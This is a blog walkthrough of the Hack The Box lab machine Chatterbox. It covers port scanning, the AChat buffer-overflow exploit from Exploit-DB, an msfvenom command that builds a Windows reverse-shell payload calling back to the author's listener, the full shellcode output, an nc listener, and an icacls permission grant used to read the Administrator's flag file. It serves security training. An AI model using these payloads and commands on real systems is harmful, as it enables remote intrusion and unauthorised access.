This is my write-up/walkthrough for [the Hack The Box machine, Chatterbox](https://app.hackthebox.com/machines/Chatterbox). It's a Windows machine, rated "Medium", with 10.10.10.74 as its IP address.

![Alt text](/images/chatterbox/2022-03-28-hack-the-box-chatterbox-01.JPG "Chatterbox Info Card")

I started with, as always, an nmap scan—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.74
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 08:10 EDT
Nmap scan report for 10.10.10.74
Host is up (0.28s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/28%OT=135%CT=1%CU=43285%PV=Y%DS=2%DC=T%G=Y%TM=6241A7
OS:30%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=I%CI=I%TS=7)SEQ(SP=
OS:104%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M54BNW8ST11%O2=M54BNW8
OS:ST11%O3=M54BNW8NNT11%O4=M54BNW8ST11%O5=M54BNW8ST11%O6=M54BST11)WIN(W1=20
OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
OS:4BNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-03-28T17:16:35
|_  start_date: 2022-03-27T20:54:19
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-28T13:16:37-04:00
|_clock-skew: mean: 6h19m59s, deviation: 2h18m35s, median: 4h59m58s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   170.61 ms 10.10.16.1
2   352.33 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 380.83 seconds

```

—and immediately jumped on that port 445 (SMB).

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -L 10.10.10.74        
Enter WORKGROUP\thatvirdiguy's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.74 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                  
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -L 10.10.10.74 -U Administrator
Enter WORKGROUP\Administrator's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

That didn't work. I had nothing else to go on with so I figured I'll run `nmap` again, this time expanding the scope.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sT -p- -T4 10.10.10.74                                                                                                                                                                       130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 09:06 EDT
Nmap scan report for 10.10.10.74
Host is up (0.28s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon
9256/tcp  open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 827.21 seconds
```

Port 9255 and 9256 didn't pop up the first time around, so that caught my eye immediately. A quick google search told me that while [port 9255](https://www.speedguide.net/port.php?port=9255) might not be of interest, [port 9256](https://www.speedguide.net/port.php?port=9256) should be. I decided to run an nmap scan again, specifically for these two ports.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sV -p 9255,9256 10.10.10.74     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 10:57 EDT
Nmap scan report for 10.10.10.74
Host is up (0.77s latency).

PORT     STATE  SERVICE VERSION
9255/tcp open   http    AChat chat system httpd
9256/tcp open   achat   AChat chat system

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds
```

Well, apparently both these ports were of interest. Further research pointed out that this "AChat" was vulnerable to remote buffer overflow exploit, so I decided to pursue that path.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ searchsploit AChat               
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                                                                                      | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                                                                                         | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                            | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                                                                                              | php/webapps/24647.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

https://www.exploit-db.com/exploits/36025

┌──(thatvirdiguy㉿kali)-[~]
└─$ searchsploit -m 36025.py
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/thatvirdiguy/36025.py

```

I spent some time reading that code and it looked like it was launching "`calc.exe`" – the Calculator app on Windows – using that MSFVenom command. I realised it might be possible to play around with this script and update it to suit my needs and, ideally, get a reverse shell. The problem was that I have only basic knowledge on MSFVenom. Fortunately, I found [this](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/#windows-reverse-shells) cheat sheet and updated—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ cat 36025.py | grep msfvenom
# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

—to the following to get the shellcode I needed to alter the script to my needs.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.21 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3767 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x49\x6c\x7a\x48\x33\x52"
buf += b"\x4b\x50\x69\x70\x59\x70\x71\x50\x43\x59\x6a\x45\x4d"
buf += b"\x61\x39\x30\x31\x54\x62\x6b\x6e\x70\x4e\x50\x62\x6b"
buf += b"\x71\x42\x4a\x6c\x44\x4b\x6e\x72\x5a\x74\x72\x6b\x53"
buf += b"\x42\x6e\x48\x4a\x6f\x47\x47\x6f\x5a\x4e\x46\x4c\x71"
buf += b"\x69\x6f\x64\x6c\x6f\x4c\x33\x31\x51\x6c\x39\x72\x6c"
buf += b"\x6c\x4b\x70\x69\x31\x56\x6f\x4c\x4d\x69\x71\x37\x57"
buf += b"\x38\x62\x38\x72\x31\x42\x31\x47\x42\x6b\x31\x42\x4a"
buf += b"\x70\x74\x4b\x6f\x5a\x4d\x6c\x62\x6b\x30\x4c\x6c\x51"
buf += b"\x30\x78\x78\x63\x61\x38\x4d\x31\x56\x71\x42\x31\x72"
buf += b"\x6b\x72\x39\x4f\x30\x4b\x51\x36\x73\x52\x6b\x4f\x59"
buf += b"\x7a\x78\x5a\x43\x6c\x7a\x30\x49\x72\x6b\x6f\x44\x64"
buf += b"\x4b\x4d\x31\x76\x76\x4d\x61\x79\x6f\x34\x6c\x39\x31"
buf += b"\x56\x6f\x5a\x6d\x6d\x31\x78\x47\x4e\x58\x57\x70\x74"
buf += b"\x35\x5a\x56\x6a\x63\x61\x6d\x5a\x58\x4f\x4b\x71\x6d"
buf += b"\x6c\x64\x43\x45\x47\x74\x70\x58\x62\x6b\x70\x58\x6e"
buf += b"\x44\x59\x71\x47\x63\x50\x66\x34\x4b\x4c\x4c\x6e\x6b"
buf += b"\x44\x4b\x4f\x68\x6b\x6c\x6d\x31\x59\x43\x72\x6b\x4d"
buf += b"\x34\x54\x4b\x4b\x51\x68\x50\x34\x49\x70\x44\x6b\x74"
buf += b"\x4c\x64\x4f\x6b\x31\x4b\x31\x51\x62\x39\x70\x5a\x4e"
buf += b"\x71\x49\x6f\x37\x70\x71\x4f\x61\x4f\x4e\x7a\x64\x4b"
buf += b"\x6e\x32\x4a\x4b\x44\x4d\x6f\x6d\x53\x38\x4d\x63\x4d"
buf += b"\x62\x49\x70\x6b\x50\x71\x58\x74\x37\x61\x63\x4e\x52"
buf += b"\x71\x4f\x4e\x74\x4f\x78\x4e\x6c\x53\x47\x6b\x76\x59"
buf += b"\x77\x79\x6f\x69\x45\x56\x58\x36\x30\x4a\x61\x4b\x50"
buf += b"\x39\x70\x6b\x79\x48\x44\x70\x54\x50\x50\x43\x38\x6b"
buf += b"\x79\x73\x50\x72\x4b\x6d\x30\x69\x6f\x69\x45\x6e\x70"
buf += b"\x70\x50\x30\x50\x30\x50\x31\x30\x50\x50\x4f\x50\x70"
buf += b"\x50\x30\x68\x47\x7a\x7a\x6f\x57\x6f\x57\x70\x6b\x4f"
buf += b"\x56\x75\x56\x37\x6f\x7a\x6c\x45\x72\x48\x6b\x5a\x59"
buf += b"\x7a\x7a\x70\x4a\x75\x50\x68\x79\x72\x59\x70\x6b\x54"
buf += b"\x57\x62\x73\x59\x5a\x46\x30\x6a\x7a\x70\x42\x36\x6f"
buf += b"\x67\x73\x38\x62\x79\x43\x75\x73\x44\x63\x31\x39\x6f"
buf += b"\x48\x55\x33\x55\x47\x50\x43\x44\x5a\x6c\x4b\x4f\x30"
buf += b"\x4e\x49\x78\x34\x35\x78\x6c\x72\x48\x4c\x30\x54\x75"
buf += b"\x75\x52\x51\x46\x79\x6f\x69\x45\x53\x38\x43\x33\x42"
buf += b"\x4d\x6f\x74\x59\x70\x42\x69\x7a\x43\x6e\x77\x52\x37"
buf += b"\x30\x57\x4e\x51\x58\x76\x61\x5a\x4e\x32\x72\x39\x51"
buf += b"\x46\x38\x62\x49\x6d\x62\x46\x37\x57\x4f\x54\x4b\x74"
buf += b"\x4d\x6c\x59\x71\x4a\x61\x32\x6d\x6f\x54\x6f\x34\x7a"
buf += b"\x70\x45\x76\x6d\x30\x61\x34\x50\x54\x62\x30\x52\x36"
buf += b"\x31\x46\x71\x46\x6f\x56\x72\x36\x4e\x6e\x31\x46\x4e"
buf += b"\x76\x51\x43\x31\x46\x4f\x78\x42\x59\x78\x4c\x6f\x4f"
buf += b"\x52\x66\x49\x6f\x7a\x35\x52\x69\x49\x50\x30\x4e\x31"
buf += b"\x46\x6d\x76\x69\x6f\x4c\x70\x73\x38\x6d\x38\x62\x67"
buf += b"\x6b\x6d\x6f\x70\x39\x6f\x36\x75\x57\x4b\x5a\x50\x78"
buf += b"\x35\x75\x52\x31\x46\x70\x68\x74\x66\x43\x65\x45\x6d"
buf += b"\x35\x4d\x6b\x4f\x5a\x35\x6f\x4c\x6b\x56\x51\x6c\x6b"
buf += b"\x5a\x73\x50\x39\x6b\x49\x50\x42\x55\x4b\x55\x57\x4b"
buf += b"\x30\x47\x6e\x33\x31\x62\x42\x4f\x71\x5a\x49\x70\x51"
buf += b"\x43\x6b\x4f\x6a\x35\x41\x41"
```

It did take a little while more and some further hit and trial to get the script really working, though. But once I did, I had it running on one terminal—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ python2 36025.py
---->{P00F}!
```
—with an `nc` running on another.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ nc -lvp 1234                                                                                                                                                                                                                        1 ⨯
listening on [any] 1234 ...

```

I got the user flag soon—

```
10.10.10.74: inverse host lookup failed: Unknown host
connect to [10.10.16.21] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Windows\system32>cd ../
cd ../

C:\Windows>cd ../
cd ../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\

06/10/2009  05:42 PM                24 autoexec.bat
06/10/2009  05:42 PM                10 config.sys
07/13/2009  10:37 PM    <DIR>          PerfLogs
03/07/2022  12:31 AM    <DIR>          Program Files
12/10/2017  10:21 AM    <DIR>          Users
03/28/2022  02:30 PM    <DIR>          Windows
               2 File(s)             34 bytes
               4 Dir(s)   3,346,108,416 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users

12/10/2017  10:21 AM    <DIR>          .
12/10/2017  10:21 AM    <DIR>          ..
12/10/2017  02:34 PM    <DIR>          Administrator
12/10/2017  10:18 AM    <DIR>          Alfred
04/11/2011  10:21 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   3,346,108,416 bytes free

C:\Users>cd Alfred
cd Alfred

C:\Users\Alfred>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Alfred

12/10/2017  10:18 AM    <DIR>          .
12/10/2017  10:18 AM    <DIR>          ..
12/10/2017  01:05 PM    <DIR>          Contacts
12/10/2017  07:50 PM    <DIR>          Desktop
12/10/2017  01:05 PM    <DIR>          Documents
12/10/2017  01:25 PM    <DIR>          Downloads
12/10/2017  01:05 PM    <DIR>          Favorites
12/10/2017  01:05 PM    <DIR>          Links
12/10/2017  01:05 PM    <DIR>          Music
12/10/2017  01:05 PM    <DIR>          Pictures
12/10/2017  01:05 PM    <DIR>          Saved Games
12/10/2017  01:05 PM    <DIR>          Searches
12/10/2017  01:05 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   3,346,108,416 bytes free

C:\Users\Alfred>cd Desktop
cd Desktop

C:\Users\Alfred\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Alfred\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
03/28/2022  02:05 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,346,108,416 bytes free

C:\Users\Alfred\Desktop>type user.txt
type user.txt
f6732385c172405023c4e621997c721d
```

—but getting the root flag wasn't that easy.

Oddly enough, I could traverse the `Administrator` directory—

```
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users

12/10/2017  10:21 AM    <DIR>          .
12/10/2017  10:21 AM    <DIR>          ..
12/10/2017  02:34 PM    <DIR>          Administrator
12/10/2017  10:18 AM    <DIR>          Alfred
04/11/2011  10:21 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   3,346,108,416 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Administrator

12/10/2017  02:34 PM    <DIR>          .
12/10/2017  02:34 PM    <DIR>          ..
12/10/2017  07:08 PM    <DIR>          Contacts
12/10/2017  07:50 PM    <DIR>          Desktop
12/10/2017  07:08 PM    <DIR>          Documents
01/04/2021  05:10 AM    <DIR>          Downloads
12/10/2017  07:08 PM    <DIR>          Favorites
12/10/2017  07:08 PM    <DIR>          Links
12/10/2017  07:08 PM    <DIR>          Music
12/10/2017  07:08 PM    <DIR>          Pictures
12/10/2017  07:08 PM    <DIR>          Saved Games
12/10/2017  07:08 PM    <DIR>          Searches
12/10/2017  07:08 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   3,346,108,416 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
03/28/2022  02:05 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,346,108,416 bytes free

```

—but not read `root.txt` itself.

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.
```

It seemed there was a permissions issue on this particular file itself, and not the directory as a whole. Theoretically, a "`chown`" on this file should work – which is how I landed [here](https://stackoverflow.com/questions/2928738/how-to-grant-permission-to-users-for-a-directory-using-command-line-in-windows) and eventually got the root flag.

```
C:\Users\Administrator\Desktop>icacls "C:\Users\Administrator\Desktop\root.txt" /grant Alfred:F
icacls "C:\Users\Administrator\Desktop\root.txt" /grant Alfred:F
processed file: C:\Users\Administrator\Desktop\root.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ea7c3c41ad7233456cd78bace05764f3
```
